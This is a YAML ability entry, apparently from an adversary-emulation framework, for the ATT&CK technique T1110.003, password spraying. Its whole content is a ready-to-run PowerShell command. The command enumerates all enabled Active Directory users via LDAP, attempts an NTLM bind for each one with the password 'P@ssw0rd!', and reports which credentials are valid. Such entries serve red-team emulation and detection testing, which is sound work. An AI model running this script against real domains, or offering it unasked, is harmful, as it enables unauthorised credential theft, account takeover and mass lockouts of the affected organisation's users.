- description: 'Attempt to brute force all Active Directory domain users with a single
    password (called "password spraying") on a domain controller, via LDAP, with NTLM
    or Kerberos


    Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain
    user (to fetch the list of all domain users)

    '
  id: a59dbd1a2ac17d69455248e7d91231bc
  name: Password spray all Active Directory domain users with a single password via
    LDAP against domain controller (NTLM or Kerberos)
  platforms:
    windows:
      psh:
        cleanup: ''
        command: if ("NTLM".ToLower() -NotIn @("ntlm","kerberos")) {;   Write-Host
          "Only 'NTLM' and 'Kerberos' auth methods are supported";   exit 1; }; $DomainUsers
          = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
          -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName;
          [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")
          | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier("$env:UserDnsDomain",389);
          $DomainUsers | Foreach-Object {;   $user = $_;   $password = 'P@ssw0rd!';   $credz
          = new-object System.Net.NetworkCredential($user, $password, "$env:UserDnsDomain");   $conn
          = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz,
          [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host
          " [-] Attempting ${password} on account ${user}.";     $conn.bind();     Write-Host
          " [!] ${user}:${password} are valid credentials!";   } catch {;     Write-Host
          $_.Exception.Message;   }; }; Write-Host "End of password spraying"
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: credential-access
  technique:
    attack_id: T1110.003
    name: 'Brute Force: Password Spraying'
